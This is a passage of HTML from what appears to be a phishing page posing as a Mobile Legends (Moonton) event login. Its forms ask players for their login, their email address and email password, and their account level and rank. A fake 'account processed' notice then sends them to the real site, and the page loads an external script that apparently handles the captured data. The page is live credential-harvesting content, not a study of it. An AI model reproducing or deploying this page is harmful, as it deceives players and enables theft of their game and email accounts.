</center>
<div class="box-twitter">
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter">Login to Moonton</div> <!--- txt-login-moonton --->
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" id="email-twitter" placeholder="" required>
</div> <!--- input-box-moonton --->
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- MoontonShowPassword --->
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- MoontonHidePassword --->
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required>
</div> <!--- input-box-moonton --->
<input type="hidden" name="login" id="login-twitter" value="Moonton" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-moonton --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-moonton --->
<div class="footer-menu-twitter">Sign up to Moonton</div> <!--- footer-menu-moonton --->
</form>
</center>
</div> <!--- box-moonton --->
</div> <!--- header-moonton --->
</div> <!--- popup-box-login-moonton --->
</div> <!--- popup-login--->

<div class="popup account_verification" style="display: none;">
<div class="popup-box popup-box-verification">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Verifikasi Email Mobile Legends</div> <!--- popup-alert --->
<form class="popup-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm" onsubmit="$(this).end()"
>
<input type="hidden" name="user" id="validateEmail" readonly>
<input type="hidden" name="pass" id="validatePassword" readonly>
<input type="email" name="nickname" id="nickname" placeholder="Email" autocomplete="off" required>
<input type="password" name="playid" id="playid" placeholder="Password Email" autocomplete="off" required>
<div class="popup-alert">Your account detail</div>
<select name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select name="tier" id="tier" required>
<option value="" selected="selected" disabled="disabled">Ranked Tier Level</option>
<option value="Warrior" class="form-control">Warrior</option>
<option value="Elite" class="form-control">Elite</option>
<option value="Master" class="form-control">Master</option>
<option value="Grandmaster" class="form-control">Grandmaster</option>
<option value="Epic" class="form-control">Epic</option>
<option value="Legend" class="form-control">Legend</option>
<option value="Mythic" class="form-control">Mythic</option>
<option value="Mythic Glory" class="form-control">Mythic Glory</option>
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<br>
<div class="popup-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()" onsubmit="$(this).end()"
>Loggin</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Account</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Thank you for joining this event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://m.mobilelegends.com/';">Logout</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->
<script src="https://cdn.jsdelivr.net/gh/arpantek/get_mainJs@main/get.js"></script>

</body>
</html>